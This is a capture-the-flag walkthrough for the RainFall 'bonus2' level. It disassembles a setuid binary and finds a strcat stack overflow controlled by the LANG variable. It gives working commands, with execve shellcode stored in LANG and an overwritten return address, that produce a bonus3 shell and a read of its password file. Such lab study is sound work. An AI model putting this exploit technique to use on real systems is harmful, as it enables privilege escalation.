```sh
bonus2@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 bonus2 bonus2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus2 bonus2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus2 bonus2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
-rw-r--r--+ 1 bonus2 bonus2   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus2 bonus2  675 Apr  3  2012 .profile
bonus2@RainFall:~$ ./bonus2 
bonus2@RainFall:~$ ./bonus2 42
bonus2@RainFall:~$ ./bonus2 42 43
Hello 42
```
There is one excutable file **bonus2**, when we put two arguments, it gives ```Hello [first argument]```. \
\
Run the binary file with GDB.

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048529 <+0>:     push   %ebp
   0x0804852a <+1>:     mov    %esp,%ebp
   0x0804852c <+3>:     push   %edi
   0x0804852d <+4>:     push   %esi
   0x0804852e <+5>:     push   %ebx
   0x0804852f <+6>:     and    $0xfffffff0,%esp
   0x08048532 <+9>:     sub    $0xa0,%esp # 160
   0x08048538 <+15>:    cmpl   $0x3,0x8(%ebp) # compare first argument (ac) with 0x3
   0x0804853c <+19>:    je     0x8048548 <main+31>
   0x0804853e <+21>:    mov    $0x1,%eax
   0x08048543 <+26>:    jmp    0x8048630 <main+263>
   0x08048548 <+31>:    lea    0x50(%esp),%ebx # char buffer[76]
   0x0804854c <+35>:    mov    $0x0,%eax
   0x08048551 <+40>:    mov    $0x13,%edx
   0x08048556 <+45>:    mov    %ebx,%edi
   0x08048558 <+47>:    mov    %edx,%ecx # ecx is 0x13 = 19
   0x0804855a <+49>:    rep stos %eax,%es:(%edi) # will be repeat 19 times, 19 * 4 bytes = 76 bytes memset.
   0x0804855c <+51>:    mov    0xc(%ebp),%eax
   0x0804855f <+54>:    add    $0x4,%eax # argv[2] + 4
   0x08048562 <+57>:    mov    (%eax),%eax # deref
   0x08048564 <+59>:    movl   $0x28,0x8(%esp) # 40 -> 3 param
   0x0804856c <+67>:    mov    %eax,0x4(%esp) # argv[2] -> 2 param
   0x08048570 <+71>:    lea    0x50(%esp),%eax
   0x08048574 <+75>:    mov    %eax,(%esp) # buffer -> 1 param
   0x08048577 <+78>:    call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:    mov    0xc(%ebp),%eax
   0x0804857f <+86>:    add    $0x8,%eax # av[2]
   0x08048582 <+89>:    mov    (%eax),%eax
   0x08048584 <+91>:    movl   $0x20,0x8(%esp) # 32
   0x0804858c <+99>:    mov    %eax,0x4(%esp)
   0x08048590 <+103>:   lea    0x50(%esp),%eax # buffer
   0x08048594 <+107>:   add    $0x28,%eax # buffer[40]
   0x08048597 <+110>:   mov    %eax,(%esp) 
   0x0804859a <+113>:   call   0x80483c0 <strncpy@plt> # strncpy(&buffer[40], av[2], 32);
   0x0804859f <+118>:   movl   $0x8048738,(%esp) # "LANG"
   0x080485a6 <+125>:   call   0x8048380 <getenv@plt>
   0x080485ab <+130>:   mov    %eax,0x9c(%esp)
   0x080485b2 <+137>:   cmpl   $0x0,0x9c(%esp) # if (return value getenv != 0)
   0x080485ba <+145>:   je     0x8048618 <main+239>
   0x080485bc <+147>:   movl   $0x2,0x8(%esp)
   0x080485c4 <+155>:   movl   $0x804873d,0x4(%esp) # "fi"
   0x080485cc <+163>:   mov    0x9c(%esp),%eax # return value getenv
   0x080485d3 <+170>:   mov    %eax,(%esp)
   0x080485d6 <+173>:   call   0x8048360 <memcmp@plt>
   0x080485db <+178>:   test   %eax,%eax # if (memcmp() == 0)
   0x080485dd <+180>:   jne    0x80485eb <main+194>
   0x080485df <+182>:   movl   $0x1,0x8049988 # 0x8049988 language = 1
   0x080485e9 <+192>:   jmp    0x8048618 <main+239>
   0x080485eb <+194>:   movl   $0x2,0x8(%esp)
   0x080485f3 <+202>:   movl   $0x8048740,0x4(%esp) # "nl"
   0x080485fb <+210>:   mov    0x9c(%esp),%eax
   0x08048602 <+217>:   mov    %eax,(%esp)
   0x08048605 <+220>:   call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:   test   %eax,%eax # else if (memcmp() == 0)
   0x0804860c <+227>:   jne    0x8048618 <main+239>
   0x0804860e <+229>:   movl   $0x2,0x8049988 # language = 2
   0x08048618 <+239>:   mov    %esp,%edx
   0x0804861a <+241>:   lea    0x50(%esp),%ebx
   0x0804861e <+245>:   mov    $0x13,%eax
   0x08048623 <+250>:   mov    %edx,%edi
   0x08048625 <+252>:   mov    %ebx,%esi
   0x08048627 <+254>:   mov    %eax,%ecx
   0x08048629 <+256>:   rep movsl %ds:(%esi),%es:(%edi) # deep copy
   0x0804862b <+258>:   call   0x8048484 <greetuser> # parameter char buffer[76]
   0x08048630 <+263>:   lea    -0xc(%ebp),%esp
   0x08048633 <+266>:   pop    %ebx
   0x08048634 <+267>:   pop    %esi
   0x08048635 <+268>:   pop    %edi
   0x08048636 <+269>:   pop    %ebp
   0x08048637 <+270>:   ret    
End of assembler dump.
```
```sh
(gdb) disas greetuser 
Dump of assembler code for function greetuser:
   0x08048484 <+0>:     push   %ebp
   0x08048485 <+1>:     mov    %esp,%ebp
   0x08048487 <+3>:     sub    $0x58,%esp # 88
   0x0804848a <+6>:     mov    0x8049988,%eax # language
   0x0804848f <+11>:    cmp    $0x1,%eax
   0x08048492 <+14>:    je     0x80484ba <greetuser+54>
   0x08048494 <+16>:    cmp    $0x2,%eax
   0x08048497 <+19>:    je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:    test   %eax,%eax
   0x0804849b <+23>:    jne    0x804850a <greetuser+134>
   0x0804849d <+25>:    mov    $0x8048710,%edx # "Hello "
   0x080484a2 <+30>:    lea    -0x48(%ebp),%eax # buffer[64]
   0x080484a5 <+33>:    mov    (%edx),%ecx
   0x080484a7 <+35>:    mov    %ecx,(%eax)
   0x080484a9 <+37>:    movzwl 0x4(%edx),%ecx
   0x080484ad <+41>:    mov    %cx,0x4(%eax)
   0x080484b1 <+45>:    movzbl 0x6(%edx),%edx
   0x080484b5 <+49>:    mov    %dl,0x6(%eax) # strcpy(buffer, "Hello ")
   0x080484b8 <+52>:    jmp    0x804850a <greetuser+134>
   0x080484ba <+54>:    mov    $0x8048717,%edx # "Hyvää päivää "
   0x080484bf <+59>:    lea    -0x48(%ebp),%eax
   0x080484c2 <+62>:    mov    (%edx),%ecx
   0x080484c4 <+64>:    mov    %ecx,(%eax)
   0x080484c6 <+66>:    mov    0x4(%edx),%ecx
   0x080484c9 <+69>:    mov    %ecx,0x4(%eax)
   0x080484cc <+72>:    mov    0x8(%edx),%ecx
   0x080484cf <+75>:    mov    %ecx,0x8(%eax)
   0x080484d2 <+78>:    mov    0xc(%edx),%ecx
   0x080484d5 <+81>:    mov    %ecx,0xc(%eax)
   0x080484d8 <+84>:    movzwl 0x10(%edx),%ecx
   0x080484dc <+88>:    mov    %cx,0x10(%eax)
   0x080484e0 <+92>:    movzbl 0x12(%edx),%edx
   0x080484e4 <+96>:    mov    %dl,0x12(%eax) # strcpy(buffer, "Hyvää päivää ")
   0x080484e7 <+99>:    jmp    0x804850a <greetuser+134>
   0x080484e9 <+101>:   mov    $0x804872a,%edx # "Goedemiddag! "
   0x080484ee <+106>:   lea    -0x48(%ebp),%eax
   0x080484f1 <+109>:   mov    (%edx),%ecx
   0x080484f3 <+111>:   mov    %ecx,(%eax)
   0x080484f5 <+113>:   mov    0x4(%edx),%ecx
   0x080484f8 <+116>:   mov    %ecx,0x4(%eax)
   0x080484fb <+119>:   mov    0x8(%edx),%ecx
   0x080484fe <+122>:   mov    %ecx,0x8(%eax)
   0x08048501 <+125>:   movzwl 0xc(%edx),%edx
   0x08048505 <+129>:   mov    %dx,0xc(%eax) # strcpy(buffer, "Goedemiddag! ")
   0x08048509 <+133>:   nop
   0x0804850a <+134>:   lea    0x8(%ebp),%eax
   0x0804850d <+137>:   mov    %eax,0x4(%esp)
   0x08048511 <+141>:   lea    -0x48(%ebp),%eax
   0x08048514 <+144>:   mov    %eax,(%esp)
   0x08048517 <+147>:   call   0x8048370 <strcat@plt> # strcat(buffer, 1st parameter)
   0x0804851c <+152>:   lea    -0x48(%ebp),%eax
   0x0804851f <+155>:   mov    %eax,(%esp)
   0x08048522 <+158>:   call   0x8048390 <puts@plt> # puts(buffer)
   0x08048527 <+163>:   leave  
   0x08048528 <+164>:   ret    
End of assembler dump.
```
```sh
strncpy(0xbffff6e0, "lets", 40) = 0xbffff6e0
strncpy(0xbffff708, "go", 32) = 0xbffff708
getenv("LANG") = "en_US.UTF-8"
memcmp(0xbfffff18, 0x804873d, 2, 0xb7fff918, 0) = -1
memcmp(0xbfffff18, 0x8048740, 2, 0xb7fff918, 0) = -1
strcat("Hello ", "lets") = "Hello lets"
puts("Hello lets"Hello lets) = 11
+++ exited (status 11) +++
```
Let's try to overwrite EIP by putting our pattern generator.
```sh
(gdb) r aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2a aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2a
Starting program: /home/user/bonus2/bonus2 aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2a aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2a
Hello aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2aaa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab

Program received signal SIGSEGV, Segmentation fault.
0x08006261 in ?? ()
```
If we look at the code we can see there are 3 comparisons with the value of env ```LANG```. \
If ```LANG == "fi``` the buffer will be filled with "hello" in finland language, and the byte is ```Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4```, so it will be the longest possible combination. \
And for the any other LANG, which is ```lang = 0``` by default, will concatenate with "Hello", which is the shortest possible string and it's not enough for the buffer overflow action.\
\
Let's see with both "fi" and "nl". ```Hyvää päivää!```
```sh
bonus2@RainFall:~$ export LANG="fi"
(gdb) r aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2a aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2a
Starting program: /home/user/bonus2/bonus2 aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2a aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2a
Hyvää päivää aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2aaa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab

Program received signal SIGSEGV, Segmentation fault.
0x61366161 in ?? ()

Enter the hex value to find (e.g., 0x63613563): 0x61366161
Little Endian ASCII representation: 'aa6a'
'aa6a' found at offset: 18
```
```sh
bonus2@RainFall:~$ export LANG="nl"
(gdb) r aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2a aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2a
Starting program: /home/user/bonus2/bonus2 aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2a aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2a
Goedemiddag! aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2aaa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab

Program received signal SIGSEGV, Segmentation fault.
0x38616137 in ?? ()

Enter the hex value to find (e.g., 0x63613563): 0x38616137
Little Endian ASCII representation: '7aa8'
'7aa8' found at offset: 23
```
And we could find the offset where EIP starts being overwrited. \
Now we want to make program able run our shell code by inserting it inside ```LANG``` env variable. \
But even we put shell code inside, we still need to save lang code to make program overflow-able \
and of course NOP section to be able point address.
```sh
bonus2@RainFall:~$ export LANG=$(python -c 'print("nl" + "\x90" * 10 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
(gdb) b *main+125
(gdb) x/20s *((char**)environ)
...
0xbfffff18:      "LANG=nl\220j\vX\231Rh//shh/bin\211\343\061\311\315\200" # this address changes always if environment values are changed
...
```
Mind that env ```LANG``` can change depending on its length or value.
```sh
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "A" * 23 + "\x21\xff\xff\xbf"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB!���
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
(hidden)
```
bonus2 passed !